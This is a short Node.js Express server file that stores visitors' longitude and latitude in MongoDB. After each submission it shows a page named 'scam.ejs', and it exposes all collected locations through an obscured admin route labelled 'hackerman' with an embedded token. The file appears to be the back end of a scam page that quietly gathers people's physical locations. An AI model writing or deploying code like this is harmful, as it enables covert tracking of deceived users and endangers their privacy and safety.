const express = require("express");
const app = express();
const mongoose = require("mongoose");

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
require("dotenv").config();

mongoose.connect(process.env.DB_URI, (err) => {
  if (err) throw err;
  console.log("Connected to DB");
});

const locationSchema = new mongoose.Schema({
  long: { type: String, required: true },
  lat: { type: String, required: true },
});

const locations = mongoose.model("locations", locationSchema);

app.get("/", (req, res) => {
  res.render(__dirname + "/Pages/index.ejs");
});

app.get("/admin/hackerman/allLocations/AK22gfW5wzVD9Wbj", async (req, res) => {
  const allLoc = await locations.find();
  res.render(__dirname + "/Pages/allLoc.ejs", { allLoc });
});

app.post("/newLocation", async (req, res) => {
  try {
    const { long, lat } = req.body;
    const newLocationFromUser = new locations({
      lat,
      long,
    });
    await newLocationFromUser.save();
    res.render(__dirname + "/Pages/scam.ejs");
  } catch (e) {
    res.status(500).send("Oops, you got lucky");
  }
});

app.listen(3000, () => {
  console.log("Listening on port 3000");
});
